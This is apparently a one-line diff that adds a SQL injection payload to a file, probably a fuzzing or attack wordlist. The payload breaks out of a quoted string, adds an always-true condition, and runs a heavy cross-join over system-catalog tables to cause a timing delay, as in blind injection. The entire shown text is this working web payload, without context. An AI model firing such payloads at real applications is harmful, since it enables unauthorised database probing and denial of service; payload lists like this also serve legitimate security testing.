@@ -1,0 +1,1 @@
+1" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
